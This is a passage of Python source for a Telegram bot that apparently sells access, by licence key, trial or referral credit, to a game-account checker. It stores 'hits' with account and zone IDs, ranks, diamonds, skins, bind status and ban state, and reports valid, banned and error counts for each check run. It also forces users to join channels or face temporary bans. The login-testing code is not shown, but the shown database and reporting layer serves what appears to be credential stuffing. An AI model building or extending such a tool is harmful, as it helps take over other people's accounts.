        CREATE TABLE IF NOT EXISTS referral_stats (
            user_id INTEGER PRIMARY KEY,
            total_referrals INTEGER DEFAULT 0,
            checks_earned INTEGER DEFAULT 0,
            checks_used INTEGER DEFAULT 0
        );
        """)
        for stmt in [
            "ALTER TABLE hits ADD COLUMN last_login_ts INTEGER DEFAULT 0",
            "ALTER TABLE hits ADD COLUMN banned INTEGER DEFAULT 0",
            "ALTER TABLE users ADD COLUMN temp_ban_until INTEGER DEFAULT 0",
        ]:
            try:
                c.execute(stmt)
            except Exception:
                pass


def db_ensure_user(user_id, username=""):
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("INSERT OR IGNORE INTO users(user_id, username, first_seen, last_seen) VALUES (?,?,?,?)",
                  (user_id, username or "", now, now))
        c.execute("UPDATE users SET last_seen=?, username=? WHERE user_id=?",
                  (now, username or "", user_id))


def db_get_username(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        r = c.execute("SELECT username FROM users WHERE user_id=?", (user_id,)).fetchone()
    return (r[0] if r and r[0] else "") or "unknown"


def db_is_banned(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,)).fetchone()
    return bool(row and row[0])


def db_set_banned(user_id, banned=1):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("UPDATE users SET is_banned=? WHERE user_id=?", (int(banned), user_id))


def db_get_temp_ban_until(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("SELECT temp_ban_until FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row:
        return 0
    return int(row[0] or 0)


def db_set_temp_ban(user_id, seconds=TEMP_BAN_HOURS * 3600):
    until = int(time.time()) + int(seconds)
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("UPDATE users SET temp_ban_until=? WHERE user_id=?", (until, user_id))
    return until


def db_clear_temp_ban(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("UPDATE users SET temp_ban_until=0 WHERE user_id=?", (user_id,))


def db_all_user_ids():
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        rows = c.execute("SELECT user_id FROM users WHERE is_banned=0").fetchall()
    return [r[0] for r in rows]


def db_list_users(limit=50):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        return c.execute(
            "SELECT user_id, username, first_seen, last_seen, is_banned, temp_ban_until "
            "FROM users ORDER BY last_seen DESC LIMIT ?", (limit,)).fetchall()


def db_find_users(query):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        try:
            uid = int(query)
            rows = c.execute(
                "SELECT user_id, username, is_banned FROM users WHERE user_id=?",
                (uid,)).fetchall()
            if rows:
                return rows
        except ValueError:
            pass
        q = f"%{query}%"
        return c.execute(
            "SELECT user_id, username, is_banned FROM users WHERE username LIKE ? LIMIT 20",
            (q,)).fetchall()


def db_add_admin(user_id, added_by, note=""):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("""INSERT INTO extra_admins(user_id, added_by, added_at, note)
                     VALUES (?,?,?,?)
                     ON CONFLICT(user_id) DO UPDATE SET
                        added_by=excluded.added_by,
                        added_at=excluded.added_at,
                        note=excluded.note""",
                  (user_id, added_by, int(time.time()), note or ""))


def db_remove_admin(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        cur = c.execute("DELETE FROM extra_admins WHERE user_id=?", (user_id,))
        return cur.rowcount > 0


def db_list_admins():
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        return c.execute(
            "SELECT user_id, added_by, added_at, note FROM extra_admins ORDER BY added_at DESC"
        ).fetchall()


def db_load_extra_admins():
    try:
        rows = db_list_admins()
        for (uid, *_rest) in rows:
            ADMIN_IDS.add(int(uid))
    except Exception:
        pass


def db_insert_hit(user_id, pd, device_id, account_id, zone_id, source, banned=0):
    base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
    now = int(time.time())
    last_login_ts = int(pd.get("last_login_ts", 0) or 0)
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("""INSERT INTO hits(user_id, device_id, account_id, zone_id, nickname, level,
            skin_count, collector_tier, collector_base, collector_roman, current_rank, high_rank,
            diamonds, v2l_status, last_login_ts, banned, created_at, source)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", (
            user_id, str(device_id)[:200], int(account_id) if account_id else 0,
            int(zone_id) if zone_id else 0, str(pd.get("nickname", ""))[:100],
            int(pd.get("level", 0) or 0), int(pd.get("skin_count", 0) or 0),
            full[:80], base[:80], roman[:8],
            str(pd.get("current_rank", ""))[:60], str(pd.get("high_rank", ""))[:60],
            int(pd.get("diamonds", 0) or 0), str(pd.get("v2l_status", "N/A"))[:20],
            last_login_ts, int(banned), now, source,
        ))


def db_insert_check(user_id, check_type, total, valid, banned, errors, summary=""):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("""INSERT INTO checks(user_id, check_type, total, valid, banned, errors,
                     created_at, summary_txt) VALUES (?,?,?,?,?,?,?,?)""",
                  (user_id, check_type, total, valid, banned, errors, int(time.time()), summary[:3000]))


def db_user_hits(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        return c.execute("""SELECT id, device_id, account_id, zone_id, nickname, level, skin_count,
            collector_tier, collector_base, collector_roman, current_rank, high_rank, diamonds,
            v2l_status, created_at, source, last_login_ts, banned
            FROM hits WHERE user_id=? ORDER BY id DESC""", (user_id,)).fetchall()


def db_delete_hit(hit_id, user_id=None):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        if user_id is not None:
            c.execute("DELETE FROM hits WHERE id=? AND user_id=?", (hit_id, user_id))
        else:
            c.execute("DELETE FROM hits WHERE id=?", (hit_id,))


def db_clear_user_hits(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("DELETE FROM hits WHERE user_id=?", (user_id,))


def db_user_stats(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        tiers = c.execute("""SELECT collector_base, collector_roman, COUNT(*) FROM hits
            WHERE user_id=? GROUP BY collector_base, collector_roman""", (user_id,)).fetchall()
        ranks = c.execute("SELECT high_rank, COUNT(*) FROM hits WHERE user_id=? GROUP BY high_rank",
                          (user_id,)).fetchall()
        v2l = c.execute("SELECT v2l_status, COUNT(*) FROM hits WHERE user_id=? GROUP BY v2l_status",
                        (user_id,)).fetchall()
        total = c.execute("SELECT COUNT(*) FROM hits WHERE user_id=?", (user_id,)).fetchone()[0]
        checks = c.execute("SELECT COUNT(*) FROM checks WHERE user_id=?", (user_id,)).fetchone()[0]
        last_logins = c.execute("SELECT last_login_ts FROM hits WHERE user_id=?", (user_id,)).fetchall()
    return {"tiers": tiers, "ranks": ranks, "v2l": v2l, "total": total,
            "checks": checks, "last_logins": [r[0] for r in last_logins]}


# ======================================================================
#  KEY & ACCESS
# ======================================================================
def _gen_key():
    import secrets
    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    parts = ["".join(secrets.choice(alphabet) for _ in range(4)) for _ in range(3)]
    return "OXIDE-" + "-".join(parts)


def db_create_key(days, max_uses, admin_id, note=""):
    key = _gen_key()
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        for _ in range(5):
            row = c.execute("SELECT 1 FROM keys WHERE key=?", (key,)).fetchone()
            if not row:
                break
            key = _gen_key()
        c.execute("""INSERT INTO keys(key, days, max_uses, uses, created_by, created_at, note)
                     VALUES (?,?,?,0,?,?,?)""",
                  (key, int(days), int(max_uses), admin_id, int(time.time()), note or ""))
    return key


def db_list_keys(limit=100):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        return c.execute("""SELECT key, days, max_uses, uses, created_by, created_at,
                            bound_user, bound_at, note FROM keys
                            ORDER BY created_at DESC LIMIT ?""", (limit,)).fetchall()


def db_delete_key(key):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        cur = c.execute("DELETE FROM keys WHERE key=?", (key,))
        return cur.rowcount > 0


def db_bind_key(key, user_id):
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("""SELECT days, max_uses, uses, bound_user FROM keys
                           WHERE key=?""", (key,)).fetchone()
        if not row:
            return False, "INVALID"
        days, max_uses, uses, bound_user = row
        if bound_user and bound_user != user_id:
            return False, "ALREADY_BOUND"
        if uses >= max_uses and bound_user != user_id:
            return False, "MAX_USES"
        if not bound_user:
            c.execute("""UPDATE keys SET bound_user=?, bound_at=?, uses=uses+1
                         WHERE key=?""", (user_id, now, key))
        until = now + int(days) * 86400
        c.execute("""INSERT INTO user_access(user_id, key_active, key_until, last_key, notified_expired)
                     VALUES (?, 1, ?, ?, 0)
                     ON CONFLICT(user_id) DO UPDATE SET
                        key_active=1, key_until=excluded.key_until,
                        last_key=excluded.last_key, notified_expired=0""",
                  (user_id, until, key))
    return True, until


def db_get_access(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("""SELECT trial_used, trial_started, trial_until,
                           key_active, key_until, last_key, notified_expired
                           FROM user_access WHERE user_id=?""", (user_id,)).fetchone()
    if not row:
        return {"trial_used": 0, "trial_started": 0, "trial_until": 0,
                "key_active": 0, "key_until": 0, "last_key": "", "notified_expired": 0}
    return {"trial_used": row[0], "trial_started": row[1], "trial_until": row[2],
            "key_active": row[3], "key_until": row[4], "last_key": row[5],
            "notified_expired": row[6]}


def db_start_trial(user_id):
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("SELECT trial_used FROM user_access WHERE user_id=?",
                        (user_id,)).fetchone()
        if row and row[0]:
            return False, "TRIAL_USED"
        until = now + TRIAL_DAYS * 86400
        c.execute("""INSERT INTO user_access(user_id, trial_used, trial_started, trial_until)
                     VALUES (?, 1, ?, ?)
                     ON CONFLICT(user_id) DO UPDATE SET
                        trial_used=1, trial_started=excluded.trial_started,
                        trial_until=excluded.trial_until""",
                  (user_id, now, until))
    return True, until


def db_grant_access_admin(user_id, days):
    now = int(time.time())
    until = now + int(days) * 86400
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("""INSERT INTO user_access(user_id, key_active, key_until, notified_expired)
                     VALUES (?, 1, ?, 0)
                     ON CONFLICT(user_id) DO UPDATE SET
                        key_active=1, key_until=excluded.key_until,
                        notified_expired=0""", (user_id, until))
    return until


def db_revoke_access(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("UPDATE user_access SET key_active=0, key_until=0 WHERE user_id=?", (user_id,))


def db_mark_expired_notified(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("UPDATE user_access SET notified_expired=1 WHERE user_id=?", (user_id,))


def db_all_access_users():
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        return c.execute("""SELECT user_id, trial_until, key_until, key_active, notified_expired
                            FROM user_access""").fetchall()


def db_user_access_summary(user_id):
    a = db_get_access(user_id)
    now = int(time.time())
    lines = []
    if a["trial_used"]:
        if a["trial_until"] > now:
            lines.append(f"Trial: ACTIVE ({_format_remaining(a['trial_until'] - now)} left)")
        else:
            lines.append("Trial: EXPIRED")
    else:
        lines.append(f"Trial: NOT USED ({TRIAL_DAYS} days free available)")
    if a["key_active"] and a["key_until"] > now:
        lines.append(f"Key: ACTIVE ({_format_remaining(a['key_until'] - now)} left)")
        if a["last_key"]:
            lines.append(f"Key ID: {a['last_key']}")
    elif a["last_key"]:
        lines.append("Key: EXPIRED")
    else:
        lines.append("Key: NONE")
    return "\n".join(lines)


def _should_use_referral_credit(user_id):
    """Return True if user has NO trial/key access but HAS referral credit.
    Only then use referral credit."""
    if user_id in ADMIN_IDS:
        return False
    a = db_get_access(user_id)
    now = int(time.time())
    # If trial or key active — DO NOT consume
    if a["key_active"] and a["key_until"] > now:
        return False
    if a["trial_until"] > now:
        return False
    # Only consume if referral credit available
    try:
        return db_has_referral_credit(user_id)
    except Exception:
        return False


def _consume_one_credit(user_id):
    """Consume 1 referral credit for this user. Returns True if success."""
    try:
        return db_use_referral_credit(user_id)
    except Exception:
        return False



def has_access(user_id) -> bool:
    """Check access. Priority: Admin > Key > Trial > Referral credit."""
    if user_id in ADMIN_IDS:
        return True
    a = db_get_access(user_id)
    now = int(time.time())
    # 1. Key active
    if a["key_active"] and a["key_until"] > now:
        return True
    # 2. Trial active
    if a["trial_until"] > now:
        return True
    # 3. Referral credit (ONLY if trial/key expired)
    try:
        if db_has_referral_credit(user_id):
            return True
    except Exception:
        pass
    return False


def access_remaining_seconds(user_id):
    """Return seconds remaining. Referral credit excluded."""
    if user_id in ADMIN_IDS:
        return None
    a = db_get_access(user_id)
    now = int(time.time())
    if a["key_active"] and a["key_until"] > now:
        return a["key_until"] - now
    if a["trial_until"] > now:
        return a["trial_until"] - now
    # Referral credit — return 0 (no time-based remaining)
    return 0


# ======================================================================
#  SAFE SEND HELPERS (network retry)
# ======================================================================
async def _safe_send(bot, chat_id, text, **kwargs):
    """Send message with retry on network errors."""
    for attempt in range(3):
        try:
            return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except Exception as e:
            name = type(e).__name__
            if name in ("TimedOut", "NetworkError") and attempt < 2:
                await asyncio.sleep(1.5 * (attempt + 1))
                continue
            raise
    return None




# ======================================================================
#  PREMIUM EMOJI
# ======================================================================
PREMIUM_EMOJI_IDS = {
    "medal":    "5229045747130843073",
    "star":     "5226928895189598791",
    "no_entry": "5463358164705489689",
    "dizzy":    "5465265370703080100",
    "shield":   "5971777770227766523",
    "sun":      "5373021138316186413",
    "hand":     "5850604807093492539",
    "plate":     "6237688004501052289",
    "thumb":     "6109249923796963838",
    "gear":      "6109484957292303196",
    "party":     "6109510576772222821",
    "crown":     "6109432382597632902",
    "ghost":     "6109229282184139583",
    "tada":      "6111546700508172310",
    "yin_yang":  "6122788201879835325",
    "megaphone": "5424818078833715060",
    "cool":      "5222079954421818267",

    # Live status emojis
    "thumbsup":  "5195424863396862786",
    "fire":      "5194965843062071472",
    "ok":        "5195273281116087442",
    "lock":      "5195187910051144484",
    "fire2":     "5194936297982041100",
    "globe":     "5195280904683035242",
    "fire3":     "5197572140886433985",

    # New batch 2
    "ambulance":   "5453870826761765894",
    "scream":      "5454182632797521992",
    "brain":       "5226639745106330551",
    "battery":     "5454125707300978880",
    "mail":        "5454113432284446338",
    "hot":         "5256047523620995497",
    "refresh":     "5226702984204797593",

    # Batch 4
    "snow":        "6109667871359504367",
    "blue":        "6109260287553049550",
    "card":        "6109323479406875098",
    "handshake":   "5372957680174384345",
    "nono":        "5258160767789711124",
    "cool2":       "5372965329511139384",

    # Batch 5
    "monkey":      "5463345378587849154",
    "helmet":      "5454168390685965478",
    "sun2":        "5373021138316186413",
    "flag":        "5373304760776541441",
    "screen":      "5375099322666859339",
    "angry":       "5373261050894370026",

    # Batch 6
    "middle":      "5462957817918926146",
    "cry":         "5463137996091962323",
    "disk":        "5462956611033117422",
    "skull":       "5463250708918711044",
    "wrench":      "5462921117423384478",
    "dizzy2":      "5465137208878969279",
    "unlock":      "5465443379917629504",
    "dizzy3":      "5463274047771000031",
    "shield2":     "5465154440287757794",
    "love":        "5465262274031659421",
    "pill":        "5463081281048818043",
    "rock":        "5463412289883353404",
    "hurt":        "5463156928307801722",

    # Plans/Payment batch
    "poop":        "5465198330558557107",
    "hurt2":       "5463156928307801722",
    "pill2":       "5463081281048818043",
    "question":    "5463139580934892960",
    "arrow_up":    "5463122435425448565",
    "hand2":       "5454380420336466255",
    "mail2":       "5454113432284446338",
    "battery2":    "5454125707300978880",
    "snow2":       "6109667871359504367",
    "arrow_down":  "6109670413980143882",
    "skull2":      "6109618960271938596",
    "gift":        "6111646940749893724",
    "tree":        "6109409778184753666",
    "dice":        "5965520028647298638",
    "star2":       "5974032542158819944",
    "wave_pay":    "6075371900370951745",
    "kbz_pay":     "6075379377909012804",

    "diamond":   "5471952986970267163",
}

# Fallback unicode emoji
PREMIUM_EMOJI_FALLBACK = {
    "medal":    "\U0001F396",
    "star":     "\u2B50\uFE0F",
    "no_entry": "\u26D4\uFE0F",
    "dizzy":    "\U0001F635",
    "shield":   "\U0001F6E1",
    "sun":      "\u2600\uFE0F",
    "hand":     "\u270B",
    "plate":     "\U0001F37D\uFE0F",
    "thumb":     "\U0001F44D",
    "gear":      "\u2699\uFE0F",
    "party":     "\U0001F389",
    "crown":     "\U0001F451",
    "ghost":     "\U0001F47B",
    "tada":      "\U0001F973",
    "yin_yang":  "\u262F\uFE0F",
    "megaphone": "\U0001F4E3",
    "cool":      "\U0001F192",

    # Live status fallbacks
    "thumbsup":  "\U0001F44D",
    "fire":      "\U0001F525",
    "ok":        "\U0001F44C",
    "lock":      "\U0001F512",
    "fire2":     "\U0001F525",
    "globe":     "\U0001F30E",
    "fire3":     "\U0001F525",

    # New batch 2
    "ambulance":   "\U0001F691",
    "scream":      "\U0001F631",
    "brain":       "\U0001F9E0",
    "battery":     "\U0001F50B",
    "mail":        "\u2709\uFE0F",
    "hot":         "\U0001F525",
    "refresh":     "\U0001F504",

    # Batch 4
    "snow":        "\u2744\uFE0F",
    "blue":        "\U0001F499",
    "card":        "\U0001F0CF",
    "handshake":   "\U0001F91D",
    "nono":        "\U0001F645\u200D\u2642\uFE0F",
    "cool2":       "\U0001F60E",

    # Batch 5
    "monkey":      "\U0001F648",
    "helmet":      "\U0001FA96",
    "sun2":        "\u2600\uFE0F",
    "flag":        "\U0001F6A9",
    "screen":      "\U0001F5A5",
    "angry":       "\U0001F621",

    # Batch 6
    "middle":      "\U0001F595",
    "cry":         "\U0001F62D",
    "disk":        "\U0001F4C0",
    "skull":       "\U0001F480",
    "wrench":      "\U0001F6E0",
    "dizzy2":      "\U0001F635",
    "unlock":      "\U0001F513",
    "dizzy3":      "\U0001F635",
    "shield2":     "\U0001F6E1",
    "love":        "\U0001F970",
    "pill":        "\U0001F48A",
    "rock":        "\U0001F91F",
    "hurt":        "\U0001F915",

    # Plans/Payment batch
    "poop":        "\U0001F4A9",
    "hurt2":       "\U0001F915",
    "pill2":       "\U0001F48A",
    "question":    "\u2753",
    "arrow_up":    "\u2B06\uFE0F",
    "hand2":       "\u270B",
    "mail2":       "\u2709\uFE0F",
    "battery2":    "\U0001F50B",
    "snow2":       "\u2744\uFE0F",
    "arrow_down":  "\u2B07\uFE0F",
    "skull2":      "\U0001F480",
    "gift":        "\U0001F381",
    "tree":        "\U0001F384",
    "dice":        "\U0001F3B2",
    "star2":       "\U0001F31F",
    "wave_pay":    "\u2B50",
    "kbz_pay":     "\U0001F1F2\U0001F1F2",

    "diamond":   "\U0001F48E",
}


def _premium_emoji(name, use_premium=True):
    """Return (emoji_str, custom_emoji_id).
    If use_premium=False OR no ID → returns (unicode_fallback, None)."""
    fallback = PREMIUM_EMOJI_FALLBACK.get(name, "")
    if not use_premium:
        return fallback, None
    eid = PREMIUM_EMOJI_IDS.get(name)
    if not eid:
        return fallback, None
    # Use unicode fallback as the character + attach premium ID
    return fallback or "\u2B50", eid



def _format_remaining(seconds):
    seconds = max(0, int(seconds))
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    if h > 0:
        return f"{h}h {m}m {s}s"
    if m > 0:
        return f"{m}m {s}s"
    return f"{s}s"


async def _check_joined_all(ctx, user_id):
    missing = []
    for ch in FORCE_CHANNELS:
        try:
            member = await asyncio.wait_for(
                ctx.bot.get_chat_member(chat_id=ch["username"], user_id=user_id),
                timeout=10.0
            )
            status = getattr(member, "status", None)
            if status in ("creator", "administrator", "member"):
                continue
            missing.append(ch)
        except asyncio.TimeoutError:
            print(f"[FORCE] get_chat_member timeout for {ch['username']}")
            missing.append(ch)
        except Exception as e:
            print(f"[FORCE] check fail {ch['username']}: {type(e).__name__}")
            missing.append(ch)
    return (len(missing) == 0), missing


def _force_join_keyboard():
    _E = PREMIUM_EMOJI_IDS
    rows = []
    for ch in FORCE_CHANNELS:
        rows.append([IButton(f"Join {ch['name']}", url=ch["url"],
                             style="success",
                             icon_custom_emoji_id=_E.get("ok"))])
    rows.append([IButton("I'VE JOINED", callback_data="fj_check",
                         style="primary",
                         icon_custom_emoji_id=_E.get("handshake"))])
    return InlineKeyboardMarkup(rows)


async def _send_force_join(target, ctx, remaining_text=None):
    text = ("{lock} JOIN REQUIRED {lock}\n\n"
            "{megaphone} To use this bot, you must join BOTH channels below:\n\n"
            + "\n".join(f"{ch['name']}\n  {ch['url']}" for ch in FORCE_CHANNELS)
            + "\n\n{ok} After joining both, press I'VE JOINED.")
    if remaining_text:
        text += f"\n\nTemporary ban remaining: {remaining_text}"
    _fj_txt, _fj_ents = fmt_premium(text)
    if hasattr(target, "message") and target.message:
        try:
            if _fj_ents:
                await target.message.reply_text(
                    _fj_txt, entities=_fj_ents,
                    reply_markup=_force_join_keyboard(),
                    disable_web_page_preview=True)
            else:
                await target.message.reply_text(
                    _fj_txt,
                    reply_markup=_force_join_keyboard(),
                    disable_web_page_preview=True)
        except Exception:
            await target.message.reply_text(text, reply_markup=_force_join_keyboard(),
                                            disable_web_page_preview=True)
    else:
        try:
            if _fj_ents:
                await target.reply_text(_fj_txt, entities=_fj_ents,
                                        reply_markup=_force_join_keyboard(),
                                        disable_web_page_preview=True)
            else:
                await target.reply_text(_fj_txt,
                                        reply_markup=_force_join_keyboard(),
                                        disable_web_page_preview=True)
        except Exception:
            await target.reply_text(text, reply_markup=_force_join_keyboard(),
                                    disable_web_page_preview=True)


async def _enforce_force_join(update: Update, ctx) -> bool:
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True
    if db_is_banned(uid):
        return False
    until = db_get_temp_ban_until(uid)
    now = int(time.time())
    if until > now:
        joined, _ = await _check_joined_all(ctx, uid)
        if joined:
            db_clear_temp_ban(uid)
        else:
            await _send_force_join(update, ctx,
                                   remaining_text=_format_remaining(until - now))
            return False
    joined, _ = await _check_joined_all(ctx, uid)
    if joined:
        db_clear_temp_ban(uid)
        return True
    until = db_set_temp_ban(uid, TEMP_BAN_HOURS * 3600)
    await _send_force_join(update, ctx,
                           remaining_text=_format_remaining(until - int(time.time())))
    return False


async def on_force_join_button(update: Update, ctx):
    query = update.callback_query
    uid = query.from_user.id
    await query.answer("Checking...")
    if uid in ADMIN_IDS:
        try:
            await query.edit_message_text("Verified (admin).")
        except Exception:
            pass
        return
    joined, _ = await _check_joined_all(ctx, uid)
    if joined:
        db_clear_temp_ban(uid)
        try:
            _v_txt, _v_ents = fmt_premium("{ok} Verified. Send /start to open the menu.")
            if _v_ents:
                await query.edit_message_text(_v_txt, entities=_v_ents)
            else:
                await query.edit_message_text(_v_txt)
        except Exception:
            pass
    else:
        until = db_set_temp_ban(uid, TEMP_BAN_HOURS * 3600)
        try:
            _nj_txt, _nj_ents = fmt_premium(
                f"{{nono}} You still have NOT joined all channels.\n\n"
                f"{{battery}} Temporary ban: {_format_remaining(until - int(time.time()))}")
            try:
                if _nj_ents:
                    await query.edit_message_text(
                        _nj_txt, entities=_nj_ents,
                        reply_markup=_force_join_keyboard())
                else:
                    await query.edit_message_text(
                        _nj_txt, reply_markup=_force_join_keyboard())
            except Exception:
                await query.edit_message_text(
                    f"You still have NOT joined all channels.\n\n"
                    f"Temporary ban: {_format_remaining(until - int(time.time()))}",
                    reply_markup=_force_join_keyboard())
        except Exception:
            pass


# ======================================================================
#  KEYBOARDS
# ======================================================================


async def _send_tier_image_auto(app, chat_id, players, title, check_label):
    """Auto-send Tier Breakdown Image with debug + fallback."""
    print(f"[TIER IMG] CALLED: {title} | players={len(players) if players else 0} | PIL={_PIL_OK}")
    if not players:
        print(f"[TIER IMG] SKIP {title}: no players")
        return
    if not _PIL_OK:
        print(f"[TIER IMG] SKIP {title}: Pillow not available (_PIL_OK=False)")
        try:
            await app.bot.send_message(
                chat_id=chat_id,
                text=f"\u26A0\uFE0F {title}: Image unavailable (Pillow missing)")
        except Exception:
            pass
        return
    try:
        img_path = make_tier_breakdown_image(
            players, title=title, check_label=check_label)
        print(f"[TIER IMG] {title}: generated path={img_path}")
        if img_path and os.path.isfile(img_path):
            sent_ok = False
            try:
                _cap_txt, _cap_ents = fmt_premium(
                    f"{{party}} TIER BREAKDOWN {{party}}\n"
                    f"{{crown}} Info hits: {len(players)}\n"
                    f"{{thumb}} DEV - {DEV_TAG}")
                with open(img_path, "rb") as photo:
                    if _cap_ents:
                        await app.bot.send_photo(
                            chat_id=chat_id,
                            photo=photo,
                            caption=_cap_txt,
                            caption_entities=_cap_ents
                        )
                    else:
                        await app.bot.send_photo(
                            chat_id=chat_id,
                            photo=photo,
                            caption=_cap_txt
                        )
                sent_ok = True
                print(f"[TIER IMG] {title}: SENT OK")
            except Exception as e:
                print(f"[TIER IMG] {title} send_photo fail: {type(e).__name__}: {e}")
            if not sent_ok:
                try:
                    with open(img_path, "rb") as photo:
                        await app.bot.send_document(
                            chat_id=chat_id,
                            document=photo,
                            caption=f"\U0001F4CA {title} Breakdown (fallback)"
                        )
                    print(f"[TIER IMG] {title}: SENT AS DOCUMENT")
                except Exception as e2:
                    print(f"[TIER IMG] {title} document fallback fail: {type(e2).__name__}: {e2}")
                    try:
                        await app.bot.send_message(
                            chat_id=chat_id,
                            text=f"\u26A0\uFE0F {title}: image send failed ({type(e).__name__})")
                    except Exception:
                        pass
            try:
                os.remove(img_path)
            except Exception:
                pass
        else:
            print(f"[TIER IMG] {title}: NO IMAGE FILE generated")
    except Exception as e:
        import traceback
        print(f"[TIER IMG] {title} fail: {type(e).__name__}: {e}")
        traceback.print_exc()


def _fmt_eta(seconds):
    try:
        seconds = max(0, int(seconds))
        if seconds < 60:
            return f"{seconds}s"
        m = seconds // 60
        s = seconds % 60
        if m < 60:
            return f"{m}m {s}s"
        h = m // 60
        m2 = m % 60
        return f"{h}h {m2}m"
    except Exception:
        return "?"


def _build_live_status_text(job_data, label="CHECK"):
    """Return (text, entities) tuple with PREMIUM emoji.
    text has unicode emoji + entities carry custom_emoji_ids."""
    if not job_data:
        t, e = fmt_premium(f"{{fire}} {label} RUNNING {{fire}}\n(no data)")
        return t, e

    step = job_data.get("step", 1)
    step_name = job_data.get("step_name", "?")
    done = job_data.get("done", 0)
    total = job_data.get("total", 0)
    counts = job_data.get("counts", {}) or {}
    valid = counts.get("valid", 0)
    info = counts.get("info", 0)
    banned = counts.get("banned", 0)
    errors = counts.get("errors", 0)
    started = job_data.get("started", time.time())
    elapsed = time.time() - started

    eta_str = "?"
    if done > 0 and total > 0 and elapsed > 0:
        rate = done / elapsed
        if rate > 0:
            eta_str = _fmt_eta(max(0, total - done) / rate)

    progress_pct = 0
    if total > 0:
        progress_pct = min(100, int(done * 100 / total))
    bar_filled = int(progress_pct / 5)
    bar = "\u2588" * bar_filled + "\u2591" * (20 - bar_filled)

    template = (
        f"{{fire}} {label} RUNNING {{fire}}\n"
        f"\n"
        f"{{ok}} Step  : {step}/4 ({step_name})\n"
        f"{{thumbsup}} Done  : {done} / {total}\n"
        f"[{bar}] {progress_pct}%\n"
        f"\n"
        f"{{ok}} Valid : {valid}\n"
        f"{{globe}} Info  : {info}\n"
        f"{{lock}} Banned: {banned}\n"
        f"{{fire2}} Error : {errors}\n"
        f"\n"
        f"{{fire3}} ETA   : {eta_str}\n"
        f"{{thumbsup}} Time  : {_fmt_eta(elapsed)}"
    )

    return fmt_premium(template)




def _build_live_status_plain(job_data, label="CHECK"):
    """Plain fallback if premium fails."""
    txt, ents = _build_live_status_text(job_data, label=label)
    if ents:
        return txt
    return txt



async def _live_status_loop(app, chat_id, jid, message_id, label, stop_event):
    fail = 0
    while not stop_event.is_set():
        try:
            await asyncio.sleep(5)
            if stop_event.is_set():
                break
            j = job_get(jid)
            if not j:
                break

            txt, ents = _build_live_status_text(j, label=label)

            try:
                if ents:
                    await app.bot.edit_message_text(
                        chat_id=chat_id, message_id=message_id,
                        text=txt, entities=ents)
                else:
                    await app.bot.edit_message_text(
                        chat_id=chat_id, message_id=message_id, text=txt)
                fail = 0
            except Exception as e:
                if "not modified" in str(e).lower():
                    pass
                else:
                    fail += 1
                    if fail >= 5:
                        break
        except asyncio.CancelledError:
            break
        except Exception:
            fail += 1
            if fail >= 5:
                break
            await asyncio.sleep(2)




async def _live_status_final(app, chat_id, message_id, jid, label, final_text=None):
    """Edit live message to final DONE/STOPPED. Handles tuple AND string."""
    try:
        if final_text:
            # final_text is placeholder string — run through fmt_premium
            result = fmt_premium(final_text)
        else:
            j = job_get(jid)
            if j:
                result = _build_live_status_text(j, label=label)
            else:
                result = fmt_premium(f"{{ok}} {label} DONE")

        # Handle both tuple (text, entities) and string
        if isinstance(result, tuple):
            txt, ents = result
        else:
            txt = str(result)
            ents = []

        # Ensure txt is str
        if not isinstance(txt, str):
            txt = str(txt)

        # Replace RUNNING → DONE (safe now)
        txt = txt.replace("RUNNING", "DONE")

        # Send
        try:
            if ents:
                await app.bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=txt, entities=ents)
            else:
                await app.bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id, text=txt)
        except Exception as e:
            if "not modified" not in str(e).lower():
                print(f"[LIVE] final edit fail: {type(e).__name__}: {e}")
    except Exception as e:
        print(f"[LIVE] final outer fail: {type(e).__name__}: {e}")



def _premium_entity(offset_utf16, length_utf16, emoji_id):
    """Build CUSTOM_EMOJI entity with UTF-16 offsets."""
    try:
        from telegram import MessageEntity
        return MessageEntity(
            type=MessageEntity.CUSTOM_EMOJI,
            offset=offset_utf16,
            length=length_utf16,
            custom_emoji_id=emoji_id,
        )
    except Exception as e:
        print(f"[PREMIUM] entity build fail: {type(e).__name__}: {e}")
        return None


# Default emoji placeholder map
